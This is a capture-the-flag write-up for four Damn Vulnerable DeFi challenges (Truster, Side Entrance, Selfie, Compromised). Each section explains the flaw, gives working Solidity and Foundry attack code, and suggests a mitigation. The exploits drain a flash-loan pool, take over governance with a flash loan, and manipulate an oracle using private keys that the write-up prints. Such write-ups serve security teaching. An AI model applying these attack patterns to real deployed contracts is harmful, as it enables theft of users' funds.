# 3 - Truster

## **Problem:**
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

## **Solution:**
The flashloan function takes the target contract address as an input, which will be responsible for repaying the debt. The function directly calls target.functionCall(data) from the Address library of OpenZeppelin, without validating the type of contract at the target address.

We exploit this behavior by initiating a flashloan with a borrowed amount of 0 tokens. We pass the address of the token contract as the target and provide the function signature of the approve function as the data. This results in the TrusterLenderPool contract approving tokens to our contract.

With this approval in place, our contract is able to transfer the entire token balance from the pool to itself, effectively bypassing the intended security checks.

### **Code:**
```javascript
contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }        
}
```
## **Mitigation:**
Consider changing target parameter to be an interface that execute operations and than repay limiting the user from calling arbitrary contracts.

```diff
- function flashLoan(uint256 borrowAmount, address target, bytes calldata data) external {
+ function flashLoan(uint256 borrowAmount, IFlashLoanBorrower target, bytes calldata data) external {
```


<br><br>

# 4 - Side Entrance

## **Problem:**

A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.

You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

## **Solution:**
The pool is designed to allow `deposit`, `withdraw`, and `flashLoan` functions. The `flashLoan` function checks that the borrower has repayed by comparing contract's balance before and after the loan.
The problem is that the IFlashLoanEtherReceiver we pass can repay correctly by sending eth to the contract but it can also send them by using the `deposit` function incrementing our balance using borrowed funds.
We can then withdraw all the funds from the pool and send them to the recovery account.

### **Code:**
```javascript
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(1000e18);

        // after attack withdraw all ETH from pool
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, 1000e18);
    }

    function execute() external payable override {
        pool.deposit{value: 1000e18}();
    }

    receive() external payable {
    }
}
```

## **Mitigation:**
Consider using a lock mechanism to prevent user to call deposit during a flashloan.

```diff
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
+   lockdeposit = true;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    ...

+   lockdeposit = false;
}
```
<br>

```diff
    function deposit() external payable {
+       require(!lockdeposit, "Deposit not allowed during flashloan");
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }
```
<br><br>

# 6 - Selfie
## **Problem:**
A new lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.

What could go wrong, right ?

You start with no DVT tokens in balance, and the pool has 1.5 million at risk.

Rescue all funds from the pool and deposit them into the designated recovery account.

## **Solution:**
The pool allows users to borrow DVT tokens and then repay them. The pool also as an emergency withdraw function that can be called by the governance contract. The governance contract is a simple ERC20Votes contract that allows users to vote on proposals if they have 50%+1 of the total supply.
The DVT token is the one used for governance (ERC20Votes). 
The problem is that anyone could flashloan all the govenance tokens, delegate themself and propose a new action to start the emergency withdraw function.

Steps:
1. Flashloan all the DVT Vote tokens from the pool.
2. Now that the attacker has the majority of the votes, delegate himself and propose a new action to call the emergency withdraw function.
3. Repay the flashloan.
4. Waiting the action delay to execute the action.
5. Execute the action to withdraw all the funds from the pool.


### **Code:**
Attacker contract's `attack` function:
```javascript
function attack() external returns (uint256) {
    SelfiePool(pool).flashLoan(
        this,
        address(governanceToken),
        SelfiePool(pool).maxFlashLoan(address(governanceToken)),
        ""
    );     
    return actionId;    
}

function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data) external override returns (bytes32) {
    Votes(token).delegate(address(this));
    // Add a governance action to queue that calls emergencyExit on the pool
    actionId = ISimpleGovernance(governance).queueAction(
        pool,
        0,
        abi.encodeWithSignature("emergencyExit(address)", recovery)
    );

    // Approve to repay the loan
    IERC20(token).approve(pool, amount + fee);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

Player executing the attack and waiting for the action delay to execute the action:
```javascript
Attacker attacker = new Attacker(address(pool), recovery, address(governance), token);
uint256 actionId = attacker.attack();
// Execute the queued action after the delay
vm.warp(block.timestamp + ISimpleGovernance(governance).getActionDelay());
ISimpleGovernance(governance).executeAction(actionId);
```

## **Mitigation:**
Consider not using the same token for governance and for the pool.
Governance token should not be counted for borrowed tokens.

<br><br>

# 7 - Compromised
## **Problem:**
While poking around a web service of one of the most popular DeFi projects in the space, you get a strange response from the server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35
```

A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.

This price is fetched from an on-chain oracle, based on 3 trusted reporters: `0x188...088`, `0xA41...9D8` and `0xab3...a40`.

Starting with just 0.1 ETH in balance, pass the challenge by rescuing all ETH available in the exchange. Then deposit the funds into the designated recovery account.

## **Solution:**
The exchange use a TrustfulOracle to determine NFT price. The TrustfulOracle is composed by 3 source reporters that are trusted to provide the price of the NFT. 
The strange response is the hex rappresentation of the base64 encoding of the private key of 2 of the 3 reporters.
This means an attacker can act as the owner of the 2 oracle and change his price to any value he wants.

(You can obtain the private keys by converting from hex to bytes and then decoding the base64 string, for example using Cyberchef and the `From Hex` and `From Base64` operations.)

So we follow these steps:
1. The attacker uses the private keys to change the price of the 2 reporters to 0.
2. The attacker buys 1 NFT for any price but he will receive back the entire check cause the price is set to 0.
3. The attacker uses the private keys to change the price of the 2 reporters back to 999 ETH.
4. The attacker sells the NFT for 999 ETH and send the funds to the recovery account.

The `TrustfulOracle::_computeMedianPrice` is the function is used to compute the median price of the reporters.

```javascript
    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = getAllPricesForSymbol(symbol);
        LibSort.insertionSort(prices);
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }
```

We have 3 reporters so the function use the "if" statement to compute the median price.
This means that the median price is given by the price of the element at middle index minus 1 and the price of the element at middle index and given the fact the `_computeMedianPrice::prices` array is sorted, we are sure that it's using the 2 reporters with the lowest price:

```javascript
uint256 leftPrice = prices[(prices.length / 2) - 1]; = (3/2 - 1 = 1 - 1) = 0  (3/2 is rounded down to 1 for solidity logic)
uint256 rightPrice = prices[prices.length / 2]; = 0
return (leftPrice + rightPrice) / 2; = (0 + 0) / 2 = 0
```

## **Code:**
```javascript
        bytes32 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        bytes32 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        vm.startBroadcast(uint256(privateKey1));
        oracle.postPrice("DVNFT", 0 ether);
        vm.stopBroadcast();

        vm.startBroadcast(uint256(privateKey2));
        oracle.postPrice("DVNFT", 0 ether);
        vm.stopBroadcast();

        vm.startPrank(player);
        exchange.buyOne{value: 0.00001 ether}();
        vm.stopPrank();

        console.log("NFT bought by player: ", nft.balanceOf(player));

        vm.startBroadcast(uint256(privateKey1));
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopBroadcast();

        vm.startBroadcast(uint256(privateKey2));
        oracle.postPrice("DVNFT", 999 ether);
        vm.stopBroadcast();

        vm.startPrank(player);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        
        console.log("NFT sold by player: ", nft.balanceOf(player));
        console.log("Exchange balance: ", address(exchange).balance);
        (bool success, ) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
        require(success, "Transfer to recovery failed");
        console.log("Recovery balance: ", recovery.balance);
        
        vm.stopPrank();
```






